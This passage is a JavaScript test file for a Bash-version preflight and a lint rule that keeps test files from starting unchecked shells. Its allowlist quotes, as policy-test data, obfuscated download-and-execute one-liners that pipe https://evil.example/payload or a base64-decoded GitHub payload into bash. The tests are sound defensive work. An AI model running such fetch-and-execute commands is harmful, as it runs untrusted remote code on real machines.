// The supported-shell preflight (#380, tests/bash-preflight.mjs).
//
// The supply-chain fixtures run workflow `run:` scripts and helper scripts under
// Bash. Under macOS's /bin/bash 3.2 two refusal tests saw exit 0 from guards that
// refuse correctly on CI: before Bash 4.1 a failing `[[ ]]` does not end a
// `set -e` script; and before 4.4 build-oras.sh loses a failed build's exit status.
// The preflight refuses such a shell before any fixture runs.
//
// No Bash 3.2 exists on a Linux machine, so these tests point the real check at
// small stand-in executables that answer the version question the way an old or
// foreign shell would. The stand-in is a function argument of `checkBash` only:
// the suites call `bashPath()`/`runBash()`, which take no file and read nothing
// from the environment but PATH, and they run the very file that was checked.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, readlinkSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { delimiter, dirname, isAbsolute, join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

const root = fileURLToPath(new URL("..", import.meta.url));
const preflight = () => import("./bash-preflight.mjs");
const NEED = "need Bash 4.4 or newer";

function scratch(t) {
  const dir = mkdtempSync(join(tmpdir(), "bash-preflight-"));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

// A stand-in shell: a /bin/sh script, so it runs anywhere and is never Bash's own answer.
function standIn(dir, body, name = "bash") {
  mkdirSync(dir, { recursive: true });
  const file = join(dir, name);
  writeFileSync(file, `#!/bin/sh\n${body}\n`);
  chmodSync(file, 0o755);
  return file;
}
// Answers the version question with `output`; any other script (the errexit probe) exits `other`.
const answering = (output, other = 1) => `case "$*" in *BASH_VERSINFO*) printf '%s' '${output}' ;; *) exit ${other} ;; esac`;

test("a Bash older than the minimum is refused, naming the required and the found version (#380)", async t => {
  const { checkBash } = await preflight();
  const dir = scratch(t);
  for (const version of ["3.2", "4.0", "4.1", "4.3", "3.99", "2.05", "0.0", "1.14"]) {
    const file = standIn(join(dir, version), answering(`${version}\n`));
    assert.throws(() => checkBash(file), error => {
      assert.equal(error.name, "Error");
      assert.ok(error.message.includes(NEED), error.message);
      assert.ok(error.message.includes(`'${file}' is Bash ${version}`), error.message);
      return true;
    }, version);
  }
});

test("the minimum and newer versions are accepted, compared as numbers (#380)", async t => {
  const { checkBash } = await preflight();
  const dir = scratch(t);
  for (const version of ["4.4", "4.5", "5.0", "5.2", "5.3", "4.10", "10.0", "12.1"]) {
    const file = standIn(join(dir, version), answering(`${version}\n`));
    assert.deepEqual(checkBash(file), { file, version }, version);
  }
});

test("a shell that reports a new version but does not stop `set -e` at a failing [[ ]] is refused (#380)", async t => {
  const { checkBash } = await preflight();
  const dir = scratch(t);
  for (const [label, other] of [["exit 0", 0], ["exit 2", 2], ["exit 127", 127]]) {
    const file = standIn(join(dir, label), answering("5.3\n", other));
    assert.throws(() => checkBash(file), error => error.message.includes(NEED) && error.message.includes(`'${file}'`) && /set -e/.test(error.message), label);
  }
});

// The stand-ins above answer by looking for the string BASH_VERSINFO, so they would not
// notice a probe that had stopped probing. This one is the real Bash, except that a
// failing `[[ ]]` does not end a `set -e` script, as under Bash 3.2 and 4.0: every `]]`
// in a script becomes `]] || ! :`, which leaves the status at 1 and `set -e` out of it.
// It reports a supported version and still stops at a failing `false`, so only a probe
// of `[[ ]]` itself refuses it.
test("a working Bash that reports a supported version but does not stop `set -e` at [[ ]] is refused (#380)", async t => {
  const { bashPath, checkBash } = await preflight();
  const dir = scratch(t);
  const file = standIn(join(dir, "old-errexit"), `for a do shift; set -- "$@" "$(printf '%s' "$a" | sed 's/\\]\\]/]] || ! :/g')"; done\nexec '${bashPath()}' "$@"`);
  const ask = script => spawnSync(file, ["--noprofile", "--norc", "-e", "-c", script], { encoding: "utf8" });
  const version = ask('echo "${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"').stdout.trim();
  assert.equal(version, checkBash(bashPath()).version, "the stand-in answers the version question like the real one");
  assert.equal(ask("false; exit 0").status, 1, "the stand-in stops at a failing simple command");
  assert.equal(ask("[[ a = a ]] && echo same").stdout, "same\n", "the stand-in evaluates [[ ]]");
  assert.throws(() => checkBash(file), error => {
    assert.ok(error.message.includes(NEED) && error.message.includes(`'${file}'`), error.message);
    assert.ok(error.message.includes(`reports Bash ${version} but does not stop a 'set -e' script at a failing [[ ]] (exit status 0)`), error.message);
    return true;
  });
});

test("a shell that is not Bash, or whose answer cannot be read, is refused (#380)", async t => {
  const { checkBash } = await preflight();
  const dir = scratch(t);
  const refused = (file, label) => assert.throws(() => checkBash(file), error => {
    assert.ok(error.message.includes(NEED) && error.message.includes(`'${file}'`), `${label}: ${error.message}`);
    assert.match(error.message, /did not report a Bash version/, label);
    return true;
  }, label);
  // Node is a real executable that is not a shell.
  refused(process.execPath, "node");
  // What dash and BusyBox sh do with the question: "Bad substitution", exit 2, nothing on stdout.
  refused(standIn(join(dir, "dash"), "echo 'Bad substitution' >&2; exit 2"), "a POSIX shell");
  // zsh: no BASH_VERSINFO, so only the dot.
  refused(standIn(join(dir, "zsh"), answering(".\n")), "a shell without BASH_VERSINFO");
  const outputs = ["", "\n", "5", "5\n", "5.3", "5.3.9\n", "five.three\n", "5.three\n", "v5.3\n", " 5.3\n", "5.3 \n", "5.3\r\n", "5.3\n5.3\n", "5.3\n\n", "-5.3\n", "5.-3\n", "+5.3\n", "5,3\n", "0x5.3\n", "5.3e1\n", "GNU bash, version 5.3.9(1)-release\n", "1234.5\n"];
  outputs.forEach((output, i) => refused(standIn(join(dir, `output-${i}`), answering(output.replaceAll("\n", "'\"\n\"'"))), `output ${JSON.stringify(output)}`));
  // A good answer with a failing exit status is not an answer.
  refused(standIn(join(dir, "status"), "echo 5.3; exit 3"), "version with exit 3");
});

test("a missing or unrunnable shell is refused (#380)", async t => {
  const { checkBash } = await preflight();
  const dir = scratch(t);
  const refused = (file, label) => assert.throws(() => checkBash(file), error => {
    assert.ok(error.message.includes(NEED) && error.message.includes(`'${file}'`), `${label}: ${error.message}`);
    assert.match(error.message, /could not be run/, label);
    return true;
  }, label);
  refused(join(dir, "absent", "bash"), "no such file");
  const plain = standIn(join(dir, "plain"), answering("5.3\n"));
  chmodSync(plain, 0o644);
  refused(plain, "not executable");
  mkdirSync(join(dir, "folder", "bash"), { recursive: true });
  refused(join(dir, "folder", "bash"), "a directory");
});

// The limit is 10 seconds for the suites. Only this test passes another one, as an
// argument of `checkBash`; `bashPath()` gives none and nothing else can set it.
test("a shell that does not answer in time is refused (#380)", async t => {
  const { checkBash } = await preflight();
  const file = standIn(join(scratch(t), "slow"), "exec sleep 30");
  const started = Date.now();
  assert.throws(() => checkBash(file, 1_000), error => error.message.includes(NEED) && error.message.includes(`'${file}' could not be run (ETIMEDOUT)`));
  const elapsed = Date.now() - started;
  assert.ok(elapsed >= 900 && elapsed < 5_000, `waited ${elapsed} ms for a limit of 1000 ms`);
  const source = readFileSync(join(root, "tests/bash-preflight.mjs"), "utf8");
  assert.ok(source.includes("export function checkBash(file, limit = 10_000) {"), "the limit is 10 seconds unless a caller of checkBash says otherwise");
  assert.ok(source.includes("checkBash(findBash(process.env.PATH)).file"), "bashPath() passes no limit");
  assert.equal(source.match(/\bcheckBash\(/g).length, 2, "checkBash is called in one place");
});

test("bash is looked up on PATH the way the system does, and its absence is an error (#380)", async t => {
  const { findBash } = await preflight();
  const dir = scratch(t);
  const first = standIn(join(dir, "first"), answering("3.2\n"));
  const second = standIn(join(dir, "second"), answering("5.3\n"));
  const plain = standIn(join(dir, "plain"), answering("5.3\n"));
  chmodSync(plain, 0o644);
  mkdirSync(join(dir, "folder", "bash"), { recursive: true });
  mkdirSync(join(dir, "empty"));
  const path = (...names) => names.map(name => join(dir, name)).join(delimiter);
  assert.equal(findBash(path("first", "second")), first, "the first one wins, also when it is the old one");
  assert.equal(findBash(path("second", "first")), second);
  assert.equal(findBash(path("empty", "absent", "plain", "folder", "second")), second, "non-executable files and directories are passed over");
  for (const none of [undefined, "", delimiter, path("empty"), path("plain", "folder", "absent"), "relative/dir", "."]) {
    assert.throws(() => findBash(none), error => error.message.includes(NEED) && /no executable 'bash' on PATH/.test(error.message), JSON.stringify(none));
  }
});

test("the suites use the checked shell, and nothing but PATH selects it (#380)", async t => {
  const { bashPath, runBash, findBash, checkBash, MINIMUM_BASH } = await preflight();
  assert.deepEqual(MINIMUM_BASH, [4, 4]);
  assert.equal(bashPath.length, 0, "bashPath takes no file");
  assert.equal(bashPath(), findBash(process.env.PATH));
  assert.equal(checkBash(bashPath()).file, bashPath());
  const real = runBash(["--noprofile", "--norc", "-c", 'echo "$BASH"; [[ -n "${BASH_VERSION}" ]]'], { encoding: "utf8" });
  assert.equal(real.status, 0, real.stderr);
  assert.equal(real.stdout.trim(), bashPath(), "runBash runs the file that was checked");
  // A fixture's own PATH (stub directories first) must not change which bash runs.
  const dir = scratch(t);
  standIn(join(dir, "bin"), "echo stand-in");
  const other = runBash(["--noprofile", "--norc", "-c", 'echo "$BASH"'], { encoding: "utf8", env: { PATH: join(dir, "bin") } });
  assert.equal(other.stdout.trim(), bashPath(), "runBash does not look bash up again");
  const source = readFileSync(join(root, "tests/bash-preflight.mjs"), "utf8");
  // PATH is the only variable the preflight reads. The other mention hands the caller's
  // or the inherited environment on to the fixture, as spawnSync does by default.
  assert.deepEqual(source.match(/process\.env[\w.[\]"']*/g), ["process.env.PATH", "process.env"], "no environment variable but PATH reaches the preflight");
  assert.ok(source.includes('const { PATH = "", ...rest } = options.env ?? process.env;'), "the environment is only passed on to the fixture");
  // No argument or skip escape hatch in the helper's code; its comments may use the words.
  assert.equal(code("a(); // never a skip\n  // todo\nb(); /* skip */ c();\n/* process.argv\n */d();"), "a(); // never a skip\n\nb();  c();\nd();");
  assert.match(code('const url = "https://example.org/"; test.skip("x");'), /skip/, "code after a // inside a line is still read");
  assert.doesNotMatch(code(source), /process\.argv|skip|todo/i);
});

// Comments out: whole-line `//` comments and `/* */` blocks. A `//` after code stays (it
// could be inside a string), so stripping can only leave too much, never hide code.
function code(source) {
  return source.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^[ \t]*\/\/.*$/gm, "");
}

// A fixture looks `bash` up again: `#!/usr/bin/env bash` in a stand-in tool, `bash file`
// or `env bash` in a helper script. Those lookups read the fixture's PATH, so a `bash`
// in a relative or empty PATH entry, or in a directory a fixture puts first, would run
// instead of the checked one and no test would notice. The logging stand-ins below must
// never run.
test("every bash lookup inside a fixture finds the checked shell, whatever its PATH holds (#380)", async t => {
  const { bashPath, runBash } = await preflight();
  const dir = scratch(t);
  const marker = join(dir, "ran");
  const logging = `echo "$0 $*" >> '${marker}'; echo logging-stand-in`;
  standIn(join(dir, "relbin"), logging);
  standIn(dir, logging);
  standIn(join(dir, "first"), logging);
  writeFileSync(join(dir, "inner"), '#!/usr/bin/env bash\necho "$BASH"\n');
  chmodSync(join(dir, "inner"), 0o755);
  const script = `command -v bash; ./inner; bash -c 'echo "$BASH"'; env bash -c 'echo "$BASH"'; echo "$PATH"`;
  const rest = process.env.PATH.split(delimiter).filter(isAbsolute);
  let shared;
  const lookups = (label, options, expected) => {
    const result = runBash(["--noprofile", "--norc", "-e", "-c", script], { cwd: dir, encoding: "utf8", ...options });
    assert.equal(result.status, 0, `${label}: ${result.stdout}\n${result.stderr}`);
    const lines = result.stdout.trim().split("\n");
    assert.equal(lines.length, 5, `${label}: ${result.stdout}`);
    const [found, shebang, plain, viaEnv, path] = lines;
    shared ??= dirname(found);
    assert.equal(found, join(shared, "bash"), `${label}: one private directory for the whole process`);
    assert.deepEqual([shebang, plain, viaEnv], [found, found, found], label);
    assert.deepEqual(path.split(delimiter), [shared, ...expected], `${label}: the private directory first, then the absolute entries only`);
    assert.throws(() => readFileSync(marker), { code: "ENOENT" }, `${label}: another bash ran`);
  };
  const PATH = process.env.PATH;
  const cases = [
    ["a relative entry first", `relbin${delimiter}${PATH}`, rest],
    ["a leading empty entry", `${delimiter}${PATH}`, rest],
    ["a trailing empty entry", `${PATH}${delimiter}`, rest],
    ["an empty entry inside", `${join(dir, "empty")}${delimiter}${delimiter}${PATH}`, [join(dir, "empty"), ...rest]],
    ["the current directory", `.${delimiter}./relbin${delimiter}${PATH}`, rest],
    ["another bash in an absolute entry first", `${join(dir, "first")}${delimiter}${PATH}`, [join(dir, "first"), ...rest]],
    ["only relative entries", `relbin${delimiter}`, []],
  ];
  // "only relative entries" leaves nothing to find `env` in.
  for (const [label, path, expected] of cases.slice(0, -1)) lookups(`env.PATH with ${label}`, { env: { ...process.env, PATH: path } }, expected);
  // The same when the fixture inherits the PATH of the test process.
  try {
    for (const [label, path, expected] of cases.slice(0, -1)) {
      process.env.PATH = path;
      lookups(`inherited PATH with ${label}`, {}, expected);
    }
  } finally {
    process.env.PATH = PATH;
  }
  const [label, path] = cases.at(-1);
  const only = runBash(["--noprofile", "--norc", "-c", 'command -v bash; echo "$PATH"'], { cwd: dir, encoding: "utf8", env: { PATH: path } });
  assert.equal(only.stdout, `${join(shared, "bash")}\n${shared}\n`, label);
  const none = runBash(["--noprofile", "--norc", "-c", 'command -v bash; echo "$PATH"'], { cwd: dir, encoding: "utf8", env: {} });
  assert.equal(none.stdout, `${join(shared, "bash")}\n${shared}\n`, "an environment without PATH");
  assert.throws(() => readFileSync(marker), { code: "ENOENT" }, "another bash ran");

  // The private directory: in the OS temporary directory, nothing in it but the link.
  assert.equal(realpathSync(dirname(shared)), realpathSync(tmpdir()));
  assert.deepEqual(readdirSync(shared), ["bash"]);
  assert.equal(readlinkSync(join(shared, "bash")), bashPath());
  // And it is removed when the process ends.
  const child = spawnSync(process.execPath, ["--input-type=module", "-e", `
    import { runBash } from ${JSON.stringify(join(root, "tests/bash-preflight.mjs"))};
    process.stdout.write(runBash(["-c", "command -v bash"], { encoding: "utf8" }).stdout);
  `], { encoding: "utf8" });
  assert.equal(child.status, 0, child.stderr);
  const gone = dirname(child.stdout.trim());
  assert.ok(isAbsolute(gone) && gone !== shared && realpathSync(dirname(gone)) === realpathSync(tmpdir()), child.stdout);
  assert.equal(existsSync(gone), false, "the private directory is removed at exit");
});

// Every test file that runs Bash must do it through the preflight module, and the rule is
// kept simple enough to hold without parsing JavaScript. In every JavaScript and
// TypeScript file under tests/ (.js .mjs .cjs .jsx .ts .mts .cts .tsx, all directories),
// except the preflight and this file, no line may:
// - name a shell at the end of a string literal ("bash", "/bin/sh", [..., "bash"],
//   "env bash", shell: "/bin/zsh") or as a /bin path anywhere (a `#!/bin/bash` line).
//   However the call is spelled (spawnSync, an alias, a variable, through `env`), a shell
//   it starts has to be named somewhere, and this is where;
// - set a `shell` option or property, or read SHELL;
// - call exec() or execSync(), which always run their command line with /bin/sh.
// A line that does one of these for another reason is listed in ALLOWED with that reason,
// by its exact text, so a changed or new line is looked at again. Comments are held to
// the same rule. Lines are read as the engine reads them (logicalLines): a backslash line
// continuation is joined and a string escape is decoded first, so neither hides a name
// (#576). Decoding was chosen over refusing every escape next to a shell-name character
// because the escapes have so many spellings (\x, \u, \u{}, octal, a backslash before a
// plain letter, in a key as well as a value) that a refusal rule would be a second parser
// with its own gaps, and would flag lines that only mention a name. Other files under
// tests/ are Python tests and data (.py .json .yaml .yml), which are not read; any other
// extension, or any file under node_modules, fails (sortTestFiles). What the rule cannot
// see: a name put together at run time ("ba" + "sh", a variable, a decoded base64 string).
const SHELL = "(?:ba|z|da|k|c|a|tc|fi)?sh";
const STARTS_A_SHELL = [
  ["names a shell at the end of a string literal", new RegExp(`(?<![\\w.])${SHELL}["'\`]`)],
  ["names a shell by its /bin path", new RegExp(`/bin/${SHELL}\\b`)],
  ["sets a shell option or reads SHELL", /\bshell["'`]?\]?\s*(?::|=(?!=))|[{,]\s*shell\s*[,}]|\bSHELL\b/],
  ["calls exec() or execSync()", /\bexec(?:Sync)?\(/],
];
const ALLOWED = {
  "container-image.test.mjs": [
    // Both are arguments of `docker`: they ask for /bin/sh inside the distroless image and
    // assert that it is not there. No shell starts on the host.
    'const shell = docker(["run", "--rm", "--entrypoint", "/bin/sh", image, "-c", "exit 0"]);',
    'assert.notEqual(docker(["exec", id, "/bin/sh", "-c", "exit 0"]).status, 0);',
  ],
  "supply-chain.test.mjs": [
    // RegExp.prototype.exec, not child_process.
    "while ((m = invocationRe.exec(script))) {",
    // Dockerfile text that the reader of #485 parses and never runs: the list of allowed
    // instruction keywords, and an accepted fixture line that uses the SHELL instruction.
    'const DOCKERFILE_INSTRUCTIONS = ["ARG", "CMD", "COPY", "ENTRYPOINT", "ENV", "EXPOSE", "FROM", "HEALTHCHECK", "LABEL", "RUN", "SHELL", "STOPSIGNAL", "USER", "VOLUME", "WORKDIR"];',
    `'SHELL ["/bin/sh", "-c"]',`,
    // A composite-action fixture handed to packageInstallViolations as data and never run. It
    // keeps its `shell:` key because a real composite step must have one: without it, a check
    // that skipped every valid composite action would still pass.
    "assert.equal(packageInstallViolations(\"action.yml\", { runs: { using: \"composite\", steps: [{ run: \"sudo apt-get install -y age\", shell: \"bash\" }] } }).length, 1, \"a composite action\");",
    // A stand-in `python3` planted in the workspace that the handoff must never run: one
    // printf, in POSIX sh on purpose so that it means the same under any shell.
    "writeFileSync(tool, `#!/bin/sh\\nprintf stolen > '${marker}'\\n`);",
    // The stand-in `curl` for fetch-verified.sh. `env` looks bash up on the PATH that
    // runBash passes on, whose first entry holds only the checked one.
    '"#!/usr/bin/env bash",',
    // Text of a composite action, read by the policy under test and never run.
    'const plain = { ".github/actions/outer/action.yml": `name: c\\ndescription: d\\nruns:\\n  using: composite\\n  steps:\\n    - run: echo hi\\n      shell: bash\\n` };',
    // `run:` script text handed to downloadViolations(), which must refuse it. Never run.
    '"curl -fsSL https://example.org/x | sh",',
    `'client=cu; client+=rl; "$client" https://evil.example/payload | bash',`,
    `"eval 'cu''rl https://evil.example/payload | bash'",`,
    'assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content | base64 -d | bash").length);',
    // Mutations of parsed workflow data (a step's and a job's `shell:` key), which the
    // policy under test must refuse. Not spawn options.
    '["another shell", f => { scan(f).shell = "bash {0}"; }],',
    '["job defaults", f => { job(f).defaults = { run: { shell: "bash {0}" } }; }],',
  ],
  "supply-chain/policy.mjs": [
    // The step shells the run-step checks can read, compared with a step's `shell:` key. Not
    // a spawn option.
    "export const STEP_SHELLS = new Set([\"bash\", \"sh\"]);",
    "const shellViolation = (where, shell) => (shell === undefined || STEP_SHELLS.has(shell) ? [] : [`${where}: shell '${shell}' is not bash or sh, so the run-step checks cannot read the step`]);",
  ],
  "supply-chain/run-steps.test.mjs": [
    // Step and job `shell:` keys in parsed workflow data, which the run-step checks must
    // refuse or accept. Never run.
    "{ shell: \"python\", run: \"import subprocess; subprocess.run(['docker', 'build', '.'])\" },",
    "{ shell: \"docker build -t x . && bash {0}\", run: \"true\" },",
    "{ shell: \"pwsh\", run: \"docker build .\" },",
    "data.jobs.web.defaults = { run: { shell: \"python {0}\" } };",
    "for (const shell of [\"bash\", \"sh\"]) assert.deepEqual(buildChecks(\"ci\", withStep(\"ci\", \"web\", { shell, run: \"true\" })), [], shell);",
  ],
  "supply-chain/pinned-jobs.test.mjs": [
    // Steps added to parsed workflow data (a python step shell and a custom step shell that is
    // itself a build), which the pinned-job check must refuse. Never run.
    "[\"I2: a python step that builds\", \"image\", d => beforeBuild(d, \"build\", { shell: \"python\", run: \"import subprocess; subprocess.run(['docker', 'build', '.'])\" })],",
    "[\"S: a custom step shell that is itself a build\", \"ci\", d => afterScan(d, { shell: \"docker build -t open-model-gateway:staging . && bash {0}\", run: \"true\" })],",
  ],
  // RegExp.prototype.exec, not child_process.
  // Fixtures that set a no-op `shell` on a workflow step or job object to prove the CI
  // test refuses it (#502); nothing is spawned.
  "ci.test.mjs": [
    "[\"a no-op shell\", data => { clippy(data).shell = \"true {0}\"; }],",
    "[\"job-level run defaults\", data => { lint(data).defaults = { run: { shell: \"true {0}\" } }; }],",
  ],
  "browser/alert-webhooks.spec.ts": ["const match = /^t=(\\d+),v1=([0-9a-f]{64})$/.exec(signature);"],
};
// Source text as the JavaScript engine reads a string, so that no spelling of a name gets
// past the patterns (#576):
// - a backslash before a line break continues a string on the next line, so the physical
//   lines are joined (reported at the first one). A comment that ends in a backslash does
//   not continue, so each physical line of a joined one is judged on its own as well, and
//   the joined text only when none of them is caught (`parts`, startsAShell);
// - \xHH, \uHHHH, \u{H...} and octal escapes stand for the character they name;
// - a backslash before any other character that has no escape meaning is dropped ("ba\sh"
//   is "bash"). Quotes, \b \f \n \r \t \v, digits and \\ itself stay as written.
// Read this way, nothing is refused for being an escape: a line with escapes is judged on
// what it says. The names are still found only where they stand as text; one built at run
// time ("ba" + "sh", a variable) is not seen.
const ESCAPE = /\\(?:(\\)|x([0-9a-fA-F]{2})|u([0-9a-fA-F]{4})|u\{([0-9a-fA-F]+)\}|([0-3][0-7]{0,2}|[4-7][0-7]?)|([^bfnrtv'"`0-9xu\\\n]))/g;
function unescapeSource(line) {
  return line.replace(ESCAPE, (escape, backslash, hex, unit, braced, octal, plain) => {
    if (backslash !== undefined) return escape;
    if (plain !== undefined) return plain;
    const code = hex !== undefined ? parseInt(hex, 16) : unit !== undefined ? parseInt(unit, 16) : braced !== undefined ? parseInt(braced, 16) : parseInt(octal, 8);
    return code <= 0x10ffff ? String.fromCodePoint(code) : escape;
  });
}
function logicalLines(text) {
  const lines = [];
  let parts = [];
  const flush = () => {
    if (parts.length === 0) return;
    const raw = parts.map((part, index) => (index < parts.length - 1 ? part.source.slice(0, -1) : part.source)).join("");
    lines.push({ number: parts[0].number, raw: raw.trim(), text: unescapeSource(raw), parts: parts.length > 1 ? parts.map(({ number, source }) => ({ number, raw: source.trim(), text: unescapeSource(source) })) : [] });
    parts = [];
  };
  text.replace(/\r\n?|[\u2028\u2029]/g, "\n").split("\n").forEach((source, index) => {
    parts.push({ number: index + 1, source });
    // An odd number of trailing backslashes: the last one escapes the line break.
    if (!/(?<!\\)(?:\\\\)*\\$/.test(source)) flush();
  });
  flush();
  return lines;
}

// ALLOWED is a multiset: each listing excuses one occurrence, so a line that appears twice
// must be listed twice. Appearing more or fewer times than listed fails the rule (#498).
// An allowed line is matched by its source text: a physical line as written, or, for a
// line that is caught only once its continuations are joined, the joined text.
function startsAShell(name, text, allowed = []) {
  const found = [];
  const listed = new Map();
  for (const line of allowed) listed.set(line, (listed.get(line) ?? 0) + 1);
  const seen = new Map();
  const judge = ({ number, raw, text: line }) => {
    const broken = STARTS_A_SHELL.filter(([, pattern]) => pattern.test(line)).map(([what]) => what);
    if (broken.length === 0) return false;
    if (listed.has(raw)) seen.set(raw, (seen.get(raw) ?? 0) + 1);
    else found.push(`${name}:${number} ${broken.join(", ")}: ${raw}`);
    return true;
  };
  for (const line of logicalLines(text)) {
    if (!line.parts.map(judge).some(Boolean)) judge(line);
  }
  const times = n => `${n} ${n === 1 ? "time" : "times"}`;
  for (const [line, count] of listed) {
    const appears = seen.get(line) ?? 0;
    if (appears === 0) found.push(`${name}: an allowed line is gone, remove it from ALLOWED: ${line}`);
    else if (appears !== count) found.push(`${name}: an allowed line appears ${times(appears)} but is listed ${times(count)}: ${line}`);
  }
  return found;
}

// Which files under tests/ the rule reads. `names` are paths below tests/ with "/".
// - Every JavaScript or TypeScript spelling Node or a bundler loads is read: .js .mjs .cjs
//   .jsx .ts .mts .cts .tsx (Node 22 runs an .mts file without flags).
// - Python tests and data files are not read, as before: .py, .json, .yaml, .yml.
// - Any other extension, or none, is refused: a script in another language, or one with a
//   shebang, could start a shell the rule never sees. Add a data extension here on purpose.
// - A path through node_modules is refused: a dependency is not a test file, and a file
//   force-added there is read by nothing.
const SCANNED_FILE = /\.[cm]?[jt]sx?$/i;
const UNREAD_FILE = /\.(?:py|json|ya?ml)$/i;
function sortTestFiles(names) {
  const sorted = { scanned: [], refused: [] };
  for (const name of names) {
    if (/^bash-preflight\.(?:test\.)?mjs$/.test(name)) continue;
    if (name.split("/").includes("node_modules")) sorted.refused.push(`tests/${name}: a file under node_modules would be committed inside tests/`);
    else if (SCANNED_FILE.test(name)) sorted.scanned.push(name);
    else if (!UNREAD_FILE.test(name)) sorted.refused.push(`tests/${name}: an extension the shell rule neither reads nor knows as data; add it to SCANNED_FILE or UNREAD_FILE on purpose`);
  }
  return sorted;
}

// Every path under tests/ that git would commit: the tracked ones (a force-added file
// included) and the untracked ones that are not ignored. A build artefact or a
// dependency directory that .gitignore keeps out is not listed; a file that is listed
// but gone from the work tree (deleted, not yet staged) is dropped. A directory in the
// list is a submodule, whose files git does not list: refused. Git is asked about the
// repository at `repository` only: GIT_DIR, GIT_INDEX_FILE and the like, which git sets
// when it runs a hook, would point it (and the fixture below) at another one.
const gitEnv = () => Object.fromEntries(Object.entries(process.env).filter(([key]) => !key.startsWith("GIT_")));
function committableTestFiles(repository = root) {
  const git = spawnSync("git", ["ls-files", "-z", "--cached", "--others", "--exclude-standard", "--", "tests"], { cwd: repository, encoding: "utf8", env: gitEnv() });
  assert.equal(git.status, 0, `git ls-files failed: ${git.error ?? git.stderr}`);
  return git.stdout.split("\0").filter(Boolean).map(name => name.replace(/^tests\//, "")).filter(name => {
    const entry = statSync(join(repository, "tests", name), { throwIfNoEntry: false });
    assert.ok(!entry?.isDirectory(), `tests/${name} is a directory git lists as one entry (a submodule); its files cannot be scanned`);
    return entry !== undefined;
  });
}

test("no test file starts bash on its own (#380)", () => {
  const sorted = sortTestFiles(committableTestFiles());
  assert.deepEqual(sorted.refused, [], "files under tests/ that cannot be scanned");
  const files = sorted.scanned;
  assert.ok(files.includes("supply-chain.test.mjs") && files.includes("oci-tool.test.mjs") && files.includes("browser/stack.mjs") && files.includes("browser/helpers.ts"));
  assert.deepEqual(Object.keys(ALLOWED).filter(name => !files.includes(name)), [], "ALLOWED names a file that is gone");
  const users = [];
  for (const name of files) {
    const text = readFileSync(join(root, "tests", name), "utf8");
    assert.doesNotMatch(text, /\b(?:spawn|spawnSync|exec|execSync|execFile|execFileSync|fork)\(\s*["'`][^"'`\n]*\b(?:ba|z|da|k)?sh["'`]/, `${name} starts a shell directly`);
    assert.doesNotMatch(text, /\bshell:\s*true\b/, `${name} uses the shell option`);
    assert.doesNotMatch(text, /\b(?:checkBash|findBash)\b/, `${name} must use bashPath()/runBash(), which take no file`);
    assert.deepEqual(startsAShell(name, text, ALLOWED[name]), [], `${name} may start a shell that was not checked`);
    if (/\b(?:runBash|bashPath)\b/.test(text)) users.push(name);
  }
  assert.deepEqual(users.sort(), ["oci-tool.test.mjs", "supply-chain.test.mjs"]);
  // The rule itself: each way round the old check is refused, and ordinary lines are not.
  for (const line of [
    'spawnSync("env", ["bash", "-c", script]);',
    "spawnSync('env', ['-S', 'bash']);",
    'spawnSync("true", [], { shell: "/bin/bash" });',
    "spawnSync(command, { shell: true });",
    "const options = { shell };",
    "options.shell = process.env.SHELL;",
    'options["shell"] = true;',
    'const sh = "/bin/bash"; cp.spawnSync(sh, ["-c", script]);',
    "const sh = `${prefix}/bin/sh`;",
    'spawnSync("/usr/local/bin/bash", ["x"]);',
    'spawnSync("zsh");',
    'symlinkSync("/bin/bash", join(bin, "bash"));',
    "symlinkSync(bashPath(), join(bin, 'bash'));",
    "writeFileSync(tool, `#!/bin/bash\\nexit 0\\n`);",
    'execSync("bash -c true");',
    "cp.exec(`bash ${file}`);",
  ]) assert.equal(startsAShell("x.mjs", line).length, 1, line);
  for (const line of [
    'runBash(["-c", script], { encoding: "utf8" });',
    'spawnSync("python3", ["-I", "-"]);',
    'const FETCH_SCRIPT = ".github/scripts/fetch-verified.sh";',
    "assert.equal(step.shell, undefined);",
    "prev.shell === undefined",
    '`bash ${FETCH_SCRIPT} ${COSIGN_URL}`,',
    'git(["push", "--force-with-lease"]); await page.getByText("Refresh");',
    "assert.match(upgrade, /helm\\.sh\\/hook: pre-upgrade\\n/);",
  ]) assert.deepEqual(startsAShell("x.mjs", line), [], line);
  assert.equal(startsAShell("x.mjs", "a();", ["b();"]).length, 1, "a stale allowed line is reported");
});

// An allowed line excuses one occurrence per listing, so a second copy of it (which could
// feed a real spawn) is not excused by the first one's entry (#498).
test("an allowed shell line may appear only as often as it is listed (#498)", () => {
  const line = 'const shell = docker(["run", "--rm", "--entrypoint", "/bin/sh", image]);';
  assert.equal(startsAShell("x.mjs", line).length, 1, "the line breaks the rule when it is not listed");
  assert.deepEqual(startsAShell("x.mjs", line, [line]), [], "listed once, appearing once");
  assert.deepEqual(startsAShell("x.mjs", `${line}\na();\n  ${line}`, [line]), [`x.mjs: an allowed line appears 2 times but is listed 1 time: ${line}`], "listed once, appearing twice");
  assert.deepEqual(startsAShell("x.mjs", `${line}\n${line}`, [line, line]), [], "listing a line twice allows it twice");
  assert.deepEqual(startsAShell("x.mjs", `${line}\n${line}\n${line}`, [line, line]), [`x.mjs: an allowed line appears 3 times but is listed 2 times: ${line}`], "listed twice, appearing three times");
  assert.deepEqual(startsAShell("x.mjs", line, [line, line]), [`x.mjs: an allowed line appears 1 time but is listed 2 times: ${line}`], "listed twice, appearing once");
  assert.deepEqual(startsAShell("x.mjs", "a();", [line]), [`x.mjs: an allowed line is gone, remove it from ALLOWED: ${line}`], "listed, gone");
});

// The rule reads source the way the engine does (#576). Each line below really starts a
// shell, or sets the `shell` option, and passed the rule when it only looked at the
// characters in the file. They are handed to the scanner as strings: a file holding them
// would have to be allowlisted, which is the point of the rule.
test("a shell name hidden by a line continuation or an escape is still found (#576)", () => {
  for (const [label, source] of [
    ["a continuation inside the name", 'spawnSync("bas\\\nh", ["-c", script]);'],
    ["a continuation with CRLF", 'spawnSync("bas\\\r\nh", ["-c", script]);'],
